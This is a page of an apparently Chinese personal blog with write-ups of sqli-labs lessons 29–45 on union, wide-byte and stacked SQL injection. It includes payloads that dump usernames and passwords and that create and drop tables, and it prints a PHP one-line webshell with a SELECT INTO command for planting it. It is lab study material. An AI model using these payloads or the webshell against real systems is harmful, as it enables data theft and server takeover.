<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="ctf&#x2F;python&#x2F;c++">
<meta property="og:type" content="website">
<meta property="og:title" content="wds&#39;s 学习博客">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="wds&#39;s 学习博客">
<meta property="og:description" content="ctf&#x2F;python&#x2F;c++">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="wang deshan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>wds's 学习博客</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">wds's 学习博客</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">个人势学习分享网站，闲记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wang deshan"
      src="/uploads/avatar.jpg">
  <p class="site-author-name" itemprop="name">wang deshan</p>
  <div class="site-description" itemprop="description">ctf/python/c++</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/03/lesson42/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/03/lesson42/" class="post-title-link" itemprop="url">lesson42_45</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-03 17:17:07" itemprop="dateCreated datePublished" datetime="2022-02-03T17:17:07+08:00">2022-02-03</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2025-07-26 11:11:44" itemprop="dateModified" datetime="2025-07-26T11:11:44+08:00">2025-07-26</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="lesson42"><a href="#lesson42" class="headerlink" title="lesson42"></a>lesson42</h1><p>通过检测，username这里有对当引号进行转义。而password这里没有，所以尝试对password处进行注入</p>
<p>在这里把type改为text就可以看到密码了</p>
<p><img src="https://s2.loli.net/2022/02/16/tSMjbVdgnyReNrh.png" alt="QQ截图20220216152806.png"></p>
<p>在password里面尝试堆叠注入</p>
<p>数据包裹方式为单引号</p>
<p>a’;create table wds5418 like users;#</p>
<p>虽然显示报错但是我们成功的创建了表</p>
<p>然后用</p>
<p>a’;drop table wds5418;#</p>
<p>来删除表</p>
<h1 id="lesson43"><a href="#lesson43" class="headerlink" title="lesson43"></a>lesson43</h1><p>与lesson42相同只是对数据的包裹方式不同罢了，一模一样的堆叠注入</p>
<p>a’);create table wds5418 like users;#</p>
<p>a’);drop table wds5418;#</p>
<h1 id="lesson44"><a href="#lesson44" class="headerlink" title="lesson44"></a>lesson44</h1><p>无回显信息的注入，注入的方法和42和43一样，payload和42一样</p>
<p>a’;create table wds5418 like users;#</p>
<p>a’;drop table wds5418;#</p>
<h1 id="lesson45"><a href="#lesson45" class="headerlink" title="lesson45"></a>lesson45</h1><p>也无回显的错误信息，注入方式和44关和44一样数据包裹不一样</p>
<p>a’);create table wds5418 like users;#</p>
<p>a’);drop table wds5418;#</p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>堆叠注入的题目是开放的，因为堆叠注入可以执行所以语句。</p>
<p>网上还有师傅用堆叠注入写入一句话木马，由此可见宽字节的危害</p>
<ol>
<li>权限</li>
<li>一句话木马</li>
<li>select XX into XXX</li>
<li>绝对路径</li>
</ol>
<?php @eval($_POST[wds5418]);?>

<p>select ‘<?php @eval($_POST[wds5418]);?>‘ into ‘绝对路径’</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/lesson37/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/02/lesson37/" class="post-title-link" itemprop="url">lesson37_41</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-02 20:41:37" itemprop="dateCreated datePublished" datetime="2022-02-02T20:41:37+08:00">2022-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-18 20:25:50" itemprop="dateModified" datetime="2022-02-18T20:25:50+08:00">2022-02-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="lesson37"><a href="#lesson37" class="headerlink" title="lesson37"></a>lesson37</h1><p>与lesson34是同种类型的 <del>替身</del> 就是处理post内容，同时包含宽字节注入</p>
<p>因为相同的payload和方法都能用所以我就重新打一遍</p>
<p>�’ union select  1,database()#</p>
<p>�’ union select  group_concat(table_name)from information_schema.tables where table_schema=database(),database()#</p>
<p>�’ union select  1,group_concat(column_name)from information_schema.columns where table_name=0x7573657273#</p>
<h1 id="堆叠注入（stacked-injection）"><a href="#堆叠注入（stacked-injection）" class="headerlink" title="堆叠注入（stacked injection）"></a>堆叠注入（stacked injection）</h1><p>内容参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83351889?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">mysql注入天书</a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在sql中，分号（；）是用来表示一条sql语句的结束。</p>
<p>用；连接两个句子可以让他们一起执行</p>
<p>联合语句和它的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<p>lesson38 其实用单引号包裹数据的联合注入就可以做</p>
<p><img src="https://s2.loli.net/2022/02/15/6NIcSZq1v39HfAT.png" alt="QQ截图20220215155911.png"></p>
<p>但是网络上很多教程都讲了堆叠注入，所以我也提一下</p>
<p>堆叠注入,创一个库</p>
<p>?id=-1;create table wds5418 like users ;–+ </p>
<p><img src="https://s2.loli.net/2022/02/15/Wr8VOqluBMgPTIX.png" alt="QQ截图20220215160958.png"></p>
<p>在mysql命令行里发现成功创了一个库，注入成功。</p>
<p><img src="https://s2.loli.net/2022/02/15/vf8GrU1ze2CZFpA.png" alt="QQ截图20220215161259.png"></p>
<h1 id="lesson39"><a href="#lesson39" class="headerlink" title="lesson39"></a>lesson39</h1><p>无对数据进行包裹的联合注入就可以注入</p>
<p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<h1 id="lesson-40"><a href="#lesson-40" class="headerlink" title="lesson 40"></a>lesson 40</h1><p>没有报错的回显</p>
<p>用联合注入查询就可以做，因为没有错误回显，所以要多次尝试出数据包裹方式</p>
<p>然后就没有什么难度了</p>
<p>?id=-1’) union select 1,2,database()–+</p>
<p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’usrs’–+</p>
<p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>
<h1 id="lesson-41"><a href="#lesson-41" class="headerlink" title="lesson 41"></a>lesson 41</h1><p>同样没有报错的回显</p>
<p>其实没啥难度，主要花时间的是猜它的包裹方式</p>
<p>?id=-1 union select 1,2,database()–+</p>
<p>?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<p>?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
<p>?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson29/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/01/lesson29/" class="post-title-link" itemprop="url">lesson29_31</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-01 19:57:27" itemprop="dateCreated datePublished" datetime="2022-02-01T19:57:27+08:00">2022-02-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-18 20:28:34" itemprop="dateModified" datetime="2022-02-18T20:28:34+08:00">2022-02-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a target="_blank" rel="noopener" href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p>
<p>总之就是要再去搭一个jsp的平台来</p>
<p>同时打开phpstudy和jspstudy</p>
<p>通过index.jsp访问到index.php生成的页面</p>
<p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p>
<p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p>
<p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p>
<p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p>
<p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p>
<p>所以第二个id处可注入</p>
<p>联合查询，步骤参考lesson 1</p>
<p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
<p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p>
<p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
<p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p>
<h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p>
<p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p>
<p>查库</p>
<p>?id=1&amp;id=-3”union select 1,database(),3–+</p>
<p>查表</p>
<p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
<p>查列</p>
<p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
<p>查字段</p>
<p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p>
<h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p>
<p>就是对数据的包裹变成了双引号加括号的形式</p>
<p>?id=1&amp;id=-3”) union select 1,2,3–+</p>
<p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p>
<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p>
<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson32/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/01/lesson32/" class="post-title-link" itemprop="url">lesson32_36</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-01 16:26:34" itemprop="dateCreated datePublished" datetime="2022-02-01T16:26:34+08:00">2022-02-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-18 20:26:08" itemprop="dateModified" datetime="2022-02-18T20:26:08+08:00">2022-02-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节：GB2312、GBK、GB18030、BIG5、shift_JIS等就是常说的宽字节，实际上只有两个字节。宽字节带来的安全问题主要是ascii字符（一字节）的现象，即将两个ASCII字符误认为一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认一个字节。</p>
<p>在使用PHP连接MySQL的时候，当设置”set character set client + gbk”</p>
<p>例子：id=1‘ 处理1&#39; 进行编码 1%5c%27     带入sql后进行id=&#39; and XXX此时无法完成注入</p>
<p>​            id=1%df 处理1%df\进行编码1%df%5c%27  带入sql后id=1運’ andXXX此时存在宽字节注入漏洞</p>
<h1 id="lesson-32"><a href="#lesson-32" class="headerlink" title="lesson 32"></a>lesson 32</h1><p>观察代码</p>
<p><img src="https://s2.loli.net/2022/02/13/kKPURSOMbtgoqnL.png" alt="QQ截图20220213195156.png"></p>
<p>这段代码的作用就是在我们输入的特殊符号单引号前面加上一个\，来转意</p>
<p><img src="https://s2.loli.net/2022/02/13/reF8PB6OsKmxtQY.png" alt="QQ截图20220213195626.png"></p>
<p>宽字节注入，就是把这个转意用的\，又转意成宽字节，使我们的注入成功</p>
<p>在前面加上%81-%FE中可以成功转意的我们这里用%bb来举例</p>
<p>用联合注入</p>
<p>?id=-1%bb’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<p><img src="https://s2.loli.net/2022/02/13/qfJkblINeBPhDOc.png" alt="QQ截图20220213200704.png"></p>
<p>用字符转16进制</p>
<p>?id=-1%bb’union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=0x7573657273–+</p>
<p><img src="https://s2.loli.net/2022/02/13/l7x5hP19vwikQGe.png" alt="QQ截图20220213202357.png"></p>
<p>?id=-1%bb’union select 1,database(),group_concat(concat_ws(0x7e,username,password))from users–+</p>
<h1 id="lesson-33"><a href="#lesson-33" class="headerlink" title="lesson 33"></a>lesson 33</h1><p>和lesson32差不多，应用了addslashes()函数——在双引号（预定符号）前加入反斜杠。payload也一样</p>
<h1 id="lesson-34"><a href="#lesson-34" class="headerlink" title="lesson 34"></a>lesson 34</h1><p>很明显的是用post进行的传参，</p>
<p><img src="https://s2.loli.net/2022/02/13/oLi7JbFMDvtAI5P.png" alt="QQ截图20220213221348.png"></p>
<p>首先burpsuite抓包拦截一下数据</p>
<p><img src="https://s2.loli.net/2022/02/13/gvKYQP7SGxHoMpO.png" alt="QQ截图20220213221313.png"></p>
<p>所以username对于uname,password对应着passwd，还有一行submit</p>
<p>首先对其进行单引号的包裹试探</p>
<p><img src="https://s2.loli.net/2022/02/13/V5iFDaQsdzeTHXp.png" alt="QQ截图20220213224544.png"></p>
<p>发现前面加上了\进行转义，于是乎套用宽字节注入，然而注入失败发现注入内容变成了一个之前从来没见过的符号</p>
<p><img src="https://s2.loli.net/2022/02/13/tEg2CMsixqSBRpL.png" alt="QQ截图20220213224833.png"></p>
<p>对其进行抓包来寻找问题的出处，这时发现我们的%被转意了</p>
<p><img src="https://s2.loli.net/2022/02/13/c3sUDNmaQzt547V.png" alt="QQ截图20220213225106.png"></p>
<p>于是直接对抓包内容进行修改（宽字节注入）</p>
<p><img src="https://s2.loli.net/2022/02/13/Ys5dtQfEj9PF3Ig.png" alt="QQ截图20220213225311.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 13 Feb 2022 14:42:24 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 1758</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Less-34- Bypass Add SLASHES<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#000000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;</span>&gt;</span> Welcome<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#FF0000&quot;</span>&gt;</span> Dhakkan <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>  <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding-top:10px; font-size:15px;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:15px; height:30px;&quot;</span>&gt;</span>Username : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span> Password  : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span 